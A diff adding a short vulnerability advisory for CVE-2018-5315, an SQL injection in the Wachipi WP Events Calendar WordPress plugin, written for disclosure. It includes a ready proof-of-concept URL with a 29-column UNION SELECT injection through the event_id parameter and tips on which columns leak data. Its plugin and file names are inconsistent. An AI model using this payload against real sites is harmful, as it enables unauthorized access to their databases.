@@ -1,0 +1,53 @@
+# Exploit Title: Wichipi Events Calendar - SQL Injection
+# Date: 09-01-2018
+# Exploit Author: Dennis Veninga
+# Contact Author: d.veninga [at] networking4all.com
+# Vendor Homepage: codecanyon.net/user/wachipi
+# Version: 1.0
+# CVE-ID: CVE-2018-5315
+
+Events Calendar allows you to easily add to your website a powerful
+interactive calendar to present your events.
+
+Found 09-01-18
+Vendor reply & fix 09-01-2018
+
+The Wachipi WP Events Calendar plugin 1.0 for WordPress has SQL Injection
+via the event_id parameter to event.php.
+
+NOTE: this plugin is NOT related to the Modern Tribe Events Calendar plugin.
+
+[Additional Information]
+http://
+{TARGET}/event.php?event_id=-123%20union%20all%20select%201,2,@@version,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
+
+[Vulnerability Type]
+SQL Injection
+
+[Vendor of Product]
+https://codecanyon.net/item/wp-events-calendar-plugin/5025660 Wachipi
+
+[Affected Product Code Base]
+Events Calendar - 1.0
+
+[Affected Component]
+events.php
+
+[Attack Type]
+Remote
+
+[Impact Code execution]
+true
+
+[Impact Escalation of Privileges]
+true
+
+[Impact Information Disclosure]
+true
+
+[Attack Vectors]
+To exploit, union select 29 columns.  User can use 2 or 25 for information
+gathering.
+
+[Discoverer]
+Dennis Veninga @ Networking4all.com
